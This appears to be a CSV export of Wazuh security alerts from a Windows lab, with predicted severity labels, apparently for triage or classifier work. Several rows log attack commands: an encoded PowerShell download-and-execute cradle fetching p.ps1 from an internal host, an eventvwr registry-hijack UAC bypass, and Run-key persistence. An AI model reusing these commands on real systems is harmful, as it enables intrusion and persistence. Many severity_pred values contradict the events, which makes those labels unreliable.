@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-30T08:43:22.963Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 57, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T08:43:22.963Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T08:43:22.963Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""4366"", ""utcTime"": ""2025-12-30 08:43:22.963""}}}}",low
2025-12-30T06:27:22.401Z,Endpoint2-Win,2,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA=","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 32, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T06:27:22.401Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T06:27:22.401Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2847"", ""utcTime"": ""2025-12-30 06:27:22.401""}}}}",low
2025-12-29T12:22:42.653Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 57, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T12:22:42.653Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T12:22:42.653Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1197"", ""utcTime"": ""2025-12-29 12:22:42.653""}}}}",critical
2025-12-30T20:00:22.324Z,Endpoint1-Win,3,92004,Powershell spawned cmd.exe for UAC bypass behavior,9,T1548.002,EventChannel,"\""cmd.exe\"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d \""C:\Windows\System32\cmd.exe\"" /f & cmd.exe /c eventvwr.msc","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 24, ""mail"": true, ""level"": 9, ""description"": ""Powershell spawned cmd.exe for UAC bypass behavior"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1548.002""]}, ""id"": ""92004""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T20:00:22.324Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T20:00:22.324Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \\\""C:\\Windows\\System32\\cmd.exe\\\"" /f & cmd.exe /c eventvwr.msc"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12189"", ""utcTime"": ""2025-12-30 20:00:22.324""}}}}",critical
2025-12-30T07:32:24.482Z,Endpoint2-Win,2,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 2, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T07:32:24.482Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T07:32:24.482Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2106"", ""utcTime"": ""2025-12-30 07:32:24.482""}}}}",critical
2025-12-28T19:05:30.220Z,Endpoint3-Win,1,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgBcAFUAcwBlAHIAcwBcAGEAeQBvAHUAYgBcAEQAZQBzAGsAdABvAHAA","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 33, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T19:05:30.220Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T19:05:30.220Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgBcAFUAcwBlAHIAcwBcAGEAeQBvAHUAYgBcAEQAZQBzAGsAdABvAHAA"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11298"", ""utcTime"": ""2025-12-28 19:05:30.220""}}}}",medium
2025-12-29T06:50:37.718Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 18, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T06:50:37.718Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T06:50:37.718Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T06:50:37.718+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T05:45:15.523Z,Endpoint1-Win,3,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 35, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T05:45:15.523Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T05:45:15.523Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7401"", ""utcTime"": ""2025-12-28 05:45:15.523""}}}}",low
2025-12-28T22:35:09.715Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 4, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T22:35:09.715Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T22:35:09.715Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2412"", ""utcTime"": ""2025-12-28 22:35:09.715""}}}}",medium
2025-12-28T08:26:45.464Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 20, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T08:26:45.464Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T08:26:45.464Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T08:26:45.464+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-28T08:41:51.012Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 1, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T08:41:51.012Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T08:41:51.012Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9133"", ""utcTime"": ""2025-12-28 08:41:51.012""}}}}",low
2025-12-29T14:05:02.529Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 17, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T14:05:02.529Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T14:05:02.529Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7092"", ""utcTime"": ""2025-12-29 14:05:02.529""}}}}",low
2025-12-30T06:35:49.799Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 57, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T06:35:49.799Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T06:35:49.799Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1480"", ""utcTime"": ""2025-12-30 06:35:49.799""}}}}",low
2025-12-30T10:46:18.439Z,Endpoint1-Win,3,92041,Registry key modified suspiciously,10,T1112,EventChannel,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 17, ""mail"": true, ""level"": 10, ""description"": ""Registry key modified suspiciously"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1112""]}, ""id"": ""92041""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T10:46:18.439Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T10:46:18.439Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10447"", ""utcTime"": ""2025-12-30 10:46:18.439""}}}}",critical
2025-12-29T12:07:42.466Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 32, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T12:07:42.466Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T12:07:42.466Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10287"", ""utcTime"": ""2025-12-29 12:07:42.466""}}}}",critical
2025-12-29T02:46:27.161Z,Endpoint2-Win,2,92041,Registry key modified suspiciously,10,T1112,EventChannel,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 58, ""mail"": true, ""level"": 10, ""description"": ""Registry key modified suspiciously"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1112""]}, ""id"": ""92041""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T02:46:27.161Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T02:46:27.161Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12044"", ""utcTime"": ""2025-12-29 02:46:27.161""}}}}",critical
2025-12-28T16:37:54.758Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 55, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T16:37:54.758Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T16:37:54.758Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1201"", ""utcTime"": ""2025-12-28 16:37:54.758""}}}}",critical
2025-12-28T03:20:53.483Z,Endpoint2-Win,2,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 12, ""mail"": true, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T03:20:53.483Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T03:20:53.483Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1579"", ""utcTime"": ""2025-12-28 03:20:53.483""}}}}",critical
2025-12-28T16:20:55.329Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 18, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T16:20:55.329Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T16:20:55.329Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T16:20:55.329+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-29T17:37:04.381Z,Endpoint3-Win,1,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA=","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 15, ""mail"": true, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T17:37:04.381Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T17:37:04.381Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9450"", ""utcTime"": ""2025-12-29 17:37:04.381""}}}}",critical
